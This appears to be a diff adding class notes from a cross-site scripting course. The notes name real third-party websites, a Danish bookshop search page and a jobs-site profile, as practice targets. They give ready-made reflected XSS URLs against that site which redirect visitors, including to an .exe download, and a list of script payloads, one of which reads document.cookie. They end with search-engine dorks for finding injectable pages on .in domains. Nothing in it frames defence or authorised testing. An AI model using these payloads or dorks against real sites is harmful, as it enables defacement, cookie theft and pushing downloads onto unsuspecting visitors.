@@ -1,0 +1,106 @@
+Cross Site Scripting (XSS)
+
+
+Attendance Link: https://hw.arenaclass.stream/class_live/
+
+
+XSS Concept: https://s4mc71.github.io/interactive-xss-simulator/
+
+
+Practice Site: https://clemensantikvariat.dk/
+
+
+
+
+<script>alert("Hacked_By_AWS_64")</script>
+
+
+<script>location.href="https://arenawebsecurity.net/diploma-in-cyber-security";</script>
+
+
+
+
+https://clemensantikvariat.dk/search.php?searchString=%3Cscript%3Ealert%28%22Hacked_By_AWS_64%22%29%3C%2Fscript%3E
+
+
+
+
+https://clemensantikvariat.dk/search.php?searchString=%3Cscript%3Elocation.href%3D%22https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DdQw4w9WgXcQ%22%3B%3C%2Fscript%3E%0A
+
+
+
+
+https://clemensantikvariat.dk/search.php?searchString=%3Cscript%3EsetInterval%28%28%29%20%3D%3E%20%7Bdocument.body.style.transform%20%3D%20%22rotate%28%22%2B%28Math.random%28%29%2A2%20-%201%29%2B%22deg%29%20translate%28%22%2B%28Math.random%28%29%2A10%20-%205%29%2B%22px%2C%22%2B%28Math.random%28%29%2A10%20-%205%29%2B%22px%29%22%3B%7D%2C%2050%29%3B%3C%2Fscript%3E
+
+
+
+
+https://clemensantikvariat.dk/search.php?searchString=%3Cscript%3E%20window.location.href%20%3D%20%22https%3A%2F%2Fwww.voidtools.com%2FEverything-1.4.1.1032.x86-Setup.exe%22%3B%20%3C%2Fscript%3E
+________________
+
+
+Store Based: https://drive.google.com/drive/u/1/folders/1vy2UBxgXM1d6HeyQPy-y_jSPqag5wFCp
+
+
+
+
+https://aspirekeralajobs.com/cand-view.php?id=22663
+________________
+Script
+<script>alert("Hacked_By_AWS_64")</script>
+
+
+<script>alert(document.cookie)</script>
+
+
+<script> window.location.href = "https://www.voidtools.com/Everything-1.4.1.1032.x86-Setup.exe"; </script>
+
+
+<script>location.href="https://arenawebsecurity.net/diploma-in-cyber-security";</script>
+
+
+<script>location.href="https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
+
+
+<script>setInterval(() => {document.body.style.transform = "rotate("+(Math.random()*2 - 1)+"deg) translate("+(Math.random()*10 - 5)+"px,"+(Math.random()*10 - 5)+"px)";}, 50);</script>
+
+
+<style> @keyframes spin{to{transform:rotate(360deg)}} body{animation:spin 2s linear infinite} </style>
+
+
+<script> alert("Page hacked with XSS 🎨");  document.body.style.background="linear-gradient(45deg, red, yellow)"; </script>
+
+
+<script> speechSynthesis.speak(new SpeechSynthesisUtterance("Hello Students! This is X S S demo!")); </script>
+
+
+
+
+XSS dork
+/?s= site:.in
+/search?q= site:.in
+/index.php?lang= site:.in
+/index.php?page= site:.in
+/search?query= site:.in
+/search?keyword= site:.in
+/search/?q= site:.in
+/connexion?redirect_uri= site:.in
+/?page= site:.in
+/search/?s= site:.in
+/?keywords= site:
+/search/?keyword= site:.in
+/search-results?q=
+inurl:".php?query="
+inurl:".php?searchstring="
+inurl:".php?keyword="
+inurl:".php?file="
+inurl:".php?years="
+inurl:".php?txt="
+page_details.php?menu_id=
+gallery.php?menu_id=
+inurl:".php?tag="
+inurl:".php?max="
+inurl:".php?from="
+inurl:".php?author="
+inurl:".php?pass="
+inurl:".php?feedback=”
